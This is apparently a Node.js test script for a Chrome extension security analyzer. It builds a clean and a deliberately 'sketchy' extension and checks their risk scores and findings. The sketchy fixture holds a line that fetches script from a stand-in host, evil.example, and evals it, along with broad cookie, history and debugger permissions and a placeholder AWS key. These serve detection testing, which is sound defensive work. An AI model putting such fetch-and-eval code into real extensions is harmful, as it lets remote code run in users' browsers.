// quick sanity check — build one clean ext and one sketchy ext,
// make sure the scores land where we expect.

const fs = require("fs");
const os = require("os");
const path = require("path");
const { analyze } = require("../src/analyzer");

function makeExt(files) {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), "crxray-test-"));
  for (const [name, content] of Object.entries(files)) {
    const full = path.join(dir, name);
    fs.mkdirSync(path.dirname(full), { recursive: true });
    fs.writeFileSync(full, content);
  }
  return dir;
}

const clean = makeExt({
  "manifest.json": JSON.stringify({
    manifest_version: 3, name: "clean", version: "1.0",
    permissions: ["storage", "activeTab"],
    host_permissions: ["https://example.com/*"],
  }),
  "bg.js": "chrome.storage.local.set({ a: 1 });",
});

const sketchy = makeExt({
  "manifest.json": JSON.stringify({
    manifest_version: 3, name: "sketchy", version: "1.0",
    permissions: ["tabs", "cookies", "history", "debugger", "management"],
    host_permissions: ["<all_urls>"],
    content_scripts: [{ matches: ["<all_urls>"], js: ["inject.js"], all_frames: true }],
    web_accessible_resources: [{ resources: ["injected.js"], matches: ["<all_urls>"] }],
  }),
  "inject.js": "const f = fetch('https://evil.example/x.js'); eval(f); document.body.innerHTML = 'hi';\nconst KEY = 'AKIAIOSFODNN7EXAMPLE';",
});

let failed = 0;
function check(label, cond) {
  console.log(`${cond ? "PASS" : "FAIL"} — ${label}`);
  if (!cond) failed++;
}

const r1 = analyze(clean);
check(`clean ext scores LOW (got ${r1.band} ${r1.score})`, r1.band === "LOW");

const r2 = analyze(sketchy);
check(`sketchy ext scores CRITICAL (got ${r2.band} ${r2.score})`, r2.band === "CRITICAL");
check("eval flagged", r2.findings.some((f) => f.code === "CODE_EVAL"));
check("debugger flagged", r2.findings.some((f) => f.code === "PERM_DEBUGGER"));
check("all_urls host flagged", r2.findings.some((f) => f.code === "HOST_ALL_URLS"));
check("permission combo flagged", r2.findings.some((f) => f.code === "COMBO_DATA_EXFIL"));
check("hardcoded AWS key flagged", r2.findings.some((f) => f.code === "SECRET_AWS_KEY"));
check("web-accessible resources flagged", r2.findings.some((f) => f.code === "WAR_ALL_URLS"));

fs.rmSync(clean, { recursive: true, force: true });
fs.rmSync(sketchy, { recursive: true, force: true });
process.exit(failed ? 1 : 0);
